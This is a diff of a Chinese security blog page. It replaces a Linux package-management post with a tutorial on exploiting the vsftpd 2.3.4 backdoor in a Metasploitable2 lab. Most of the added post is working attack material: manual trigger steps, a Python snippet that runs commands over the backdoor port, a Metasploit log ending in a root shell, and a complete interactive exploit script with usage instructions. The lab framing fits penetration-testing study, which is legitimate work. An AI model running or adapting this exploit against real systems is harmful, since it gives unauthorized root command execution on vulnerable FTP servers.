@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>RHCSA之软件包管理 | Falao&#39;s Blog</title>
+  <title>安全开发-Vsftpd2.3.4后门利用脚本编写 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="RHCSA之软件包管理 | Falao&#39;s Blog">
+  <meta name="description" content="安全开发-Vsftpd2.3.4后门利用脚本编写 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -415,9 +415,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-RHCSA之软件包管理" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-安全开发-Vsftpd2-3-4后门利用脚本编写" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">RHCSA之软件包管理</h1>
+        <h1 class="article-title">安全开发-Vsftpd2.3.4后门利用脚本编写</h1>
     
     <div class="article-meta">
         
@@ -427,7 +427,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="服务器运维">服务器运维</a>
+            <a  data-rel="Python专题">Python专题</a>
             
         </span>
         
@@ -435,7 +435,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-18 19:57:18'>2021-01-18 19:15</time>
+            Created At : <time class="date" title='Updated At: 2021-01-29 17:35:09'>2021-01-29 16:59</time>
         
     </div>
     <div class="article-meta">
@@ -457,7 +457,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85"><span class="toc-text">源码编译安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RPM%E5%8C%85%E5%AE%89%E8%A3%85"><span class="toc-text">RPM包安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E5%AE%89%E8%A3%85"><span class="toc-text">包管理器安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0YUM%E6%BA%90%E6%90%AD%E5%BB%BA"><span class="toc-text">本地YUM源搭建</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%BC%8F%E6%B4%9E%E8%B5%B7%E6%BA%90"><span class="toc-text">一：漏洞起源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-text">二：手动利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">靶场环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9AFTP%E7%99%BB%E5%BD%95"><span class="toc-text">步骤一：FTP登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9APython%E8%84%9A%E6%9C%AC%E5%8F%91%E9%80%81%E5%91%BD%E4%BB%A4"><span class="toc-text">步骤二：Python脚本发送命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%9AMSF%E6%94%BB%E5%87%BB"><span class="toc-text">三：MSF攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-text">四：攻击脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">执行结果</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -473,44 +473,131 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h2><h2 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h2><h2 id="包管理器安装"><a href="#包管理器安装" class="headerlink" title="包管理器安装"></a>包管理器安装</h2><h3 id="本地YUM源搭建"><a href="#本地YUM源搭建" class="headerlink" title="本地YUM源搭建"></a>本地YUM源搭建</h3><blockquote>
-<ol>
-<li><p>将光盘塞入光驱</p>
-</li>
-<li><p>mkdir /iso                  #创建进行文件挂载目录</p>
-</li>
-<li><p>mount /dev/sr0 /iso   #挂载镜像文件到/iso</p>
-</li>
-<li><p>cd /etc/yum.repos.d/ #进入到YUM配置目录</p>
-</li>
-<li><p>rm -rf *                      #删除所有的配置文件</p>
-</li>
-<li><p>vi repo.repo              #创建并编辑新的配置</p>
-<blockquote>
-<p>[Centos_iso]          #仓库描述</p>
-<p>name = info           #对软件源的描述</p>
-<p>baseurl=file:///iso   #镜像挂载位置</p>
-<p>enable = 1             #是否启用此配置 0代表禁用 1代表启用</p>
-<p>gpgchek = 0          #是否检测软件包签名</p>
+        <h2 id="一：漏洞起源"><a href="#一：漏洞起源" class="headerlink" title="一：漏洞起源"></a>一：漏洞起源</h2><p><img src="https://s3.ax1x.com/2021/01/29/yinSw8.png"></p>
+<h2 id="二：手动利用"><a href="#二：手动利用" class="headerlink" title="二：手动利用"></a>二：手动利用</h2><h4 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h4><table>
+<thead>
+<tr>
+<th align="center">定位</th>
+<th align="center">环境</th>
+<th align="center">IP Address</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">攻击机</td>
+<td align="center">Python3.8</td>
+<td align="center">192.168.31.33</td>
+</tr>
+<tr>
+<td align="center">靶机</td>
+<td align="center">Metasploitable2</td>
+<td align="center">192.168.31.20</td>
+</tr>
+</tbody></table>
+<h4 id="步骤一：FTP登录"><a href="#步骤一：FTP登录" class="headerlink" title="步骤一：FTP登录"></a>步骤一：FTP登录</h4><blockquote>
+<p>使用用户名+:)来进行用户登录，密码随便填写，连接上后会开启后门侦听6200端口来等待命令连接</p>
 </blockquote>
-</li>
-<li><p>yum clear all           #清除之前的YUM源信息</p>
-</li>
-<li><p>yum repolist            #列出YUM的信息</p>
-</li>
-<li><p>yum -y install gcc    #安装GCC编译程序</p>
-</li>
-<li><p>vi /etc/rc.d/rc.local</p>
-<blockquote>
-<p>mount /dev/sr0 /iso         #在最后一行添加</p>
-</blockquote>
-</li>
-<li><p>chmod 755 /etc/rc.d/rc.local   #系统开机时自动挂载此脚本</p>
-</li>
-<li><p>reboot     #重启操作系统并验证</p>
-</li>
-</ol>
-</blockquote>
+<p><img src="https://s3.ax1x.com/2021/01/29/yiKiMn.png" alt="yiKiMn.png"></p>
+<h4 id="步骤二：Python脚本发送命令"><a href="#步骤二：Python脚本发送命令" class="headerlink" title="步骤二：Python脚本发送命令"></a>步骤二：Python脚本发送命令</h4><pre><code class="python">import socket                  #导入socket库
+ip = "192.168.31.33"           
+port = 6200
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((ip, 6200))         #对目标建立socket连接
+s.settimeout(1.5)     
+host = str.encode('id -u -n' + '\n')  #执行id命令查询当前用户身份信息
+s.send(host)                          #发送命令
+hostt = s.recv(1024).decode('utf-8')  #接受命令
+print(hostt)                          #打印命令执行结果</code></pre>
+<p><img src="https://s3.ax1x.com/2021/01/29/yiMm0P.png" alt="yiMm0P.png"></p>
+<h2 id="三：MSF攻击"><a href="#三：MSF攻击" class="headerlink" title="三：MSF攻击"></a>三：MSF攻击</h2><pre><code class="xaml">msf6 &gt; search vsftpd
+Matching Modules
+================
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.31.33
+RHOSTS =&gt; 192.168.31.33
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit
+[*] 192.168.31.33:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.31.33:21 - USER: 331 Please specify the password.
+[+] 192.168.31.33:21 - Backdoor service has been spawned, handling...
+[+] 192.168.31.33:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (0.0.0.0:0 -&gt; 192.168.31.33:6200) at 2021-01-29 17:28:46 +0800
+whoami
+root</code></pre>
+<h2 id="四：攻击脚本编写"><a href="#四：攻击脚本编写" class="headerlink" title="四：攻击脚本编写"></a>四：攻击脚本编写</h2><pre><code class="python">import socket    #网络编程    
+import time      #处理时间
+import sys       #接受参数   
+
+def exploit(ip, port):
+    try:
+        ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+        ftp.connect((ip, port))                 #对目标IP地址及端口进行连接
+        check = ftp.recv(1024).decode('utf-8')  #接受返回来的数据并对其进行解码操作
+        socket.setdefaulttimeout(5)             #设置请求超时时间
+        if "vsftpd 2.3.4" in check.lower():     #检测banner信息中是否存在漏洞信息
+            ftp.send(b'USER letmein:)\n')       #发送攻击数据，记住笑脸
+            ftp.send(b'PASS invaild\n')         #发送攻击数据
+            time.sleep(2)                       #等待2秒钟时间
+            ftp.close()                         #关闭连接
+            print("[+] SUCCESSFUL CONNECTİON")
+        else:
+            print("[-] Not work vsftpd 2.3.4")
+    except Exception as f:                      #异常信息给到变量f
+        print('[-] CONNECTION FAILED')
+        print(f)                                #打印异常信息
+        ftp.close()                             #关闭连接
+        sys.exit(1)                             #退出程序并返回1
+
+    try:
+        arkakapi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     #调用socket库
+        arkakapi.connect((ip, 6200))                                     #对目标IP地址及端口进行连接
+        arkakapi.setdefaulttimeout(1.5)                                  #设置请求超时时间为1.5秒
+        print('[*] SESSION CREATED')  
+        print('[!] Interactive shell to check &gt;&gt; use command shell_check')
+        host = str.encode('id -u -n' + '\n')                             #漏洞验证                           
+        arkakapi.send(host)                                              #发送命令
+        hostt = arkakapi.recv(1024).decode('utf-8')                      #打印输出当前用户信息
+        while True:
+            sendnude = input(ip + '@' + str(hostt.strip()) + "#: ")      #接受用户输入要执行的命令
+            if sendnude.lower() == 'shell_check':                        #shell终端检测
+                print('[*]Interactıve shell checked...')
+                komut = str.encode((tty + '\n'))
+                arkakapi.send(komut)
+                print(arkakapi.recv(1024).decode('utf-8'))
+            else:
+                try:
+                    komut = str.encode((sendnude + '\n'))              #将输入的命令添加换行操作在进行UTF-8编码
+                    arkakapi.send(komut)                               #发送要执行的命令
+                    responseq = arkakapi.recv(1024).decode('utf-8')    #接受并解码放回来的数据
+                    print(responseq)                                   #打印命令执行结果
+                except socket.timeout:
+                    pass
+
+            if sendnude.lower() == 'exit':                             #shell中判断退出
+                print('[*] SESSION CLOSED')
+                arkakapi.close()
+                sys.exit(1)
+    except Exception as f:                                             #异常处理
+        print('[!] Failed to connect to backdoor')
+        print(f)
+
+if __name__ == '__main__':     # 判断python脚本是否是独立执行
+    if len(sys.argv) &lt; 3:      # 脚本参数数量判断
+        print('Usage ./VSFTPexp.py &lt;İP&gt; &lt;PORT&gt;')
+        print('Example ./VSFTPexp.py 127.0.0.1 21')    
+    else:
+        exploit(sys.argv[1], int(sys.argv[2]))   #函数使用  第一个参数传递进入字符串类型  第二个参数传递进入为类型转换后的整型</code></pre>
+<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img src="https://s3.ax1x.com/2021/01/29/yilZIf.png" alt="yilZIf.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ahervias77/vsftpd-2.3.4-exploit">代码参考</a></li>
+<li>未完待续…</li>
+</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
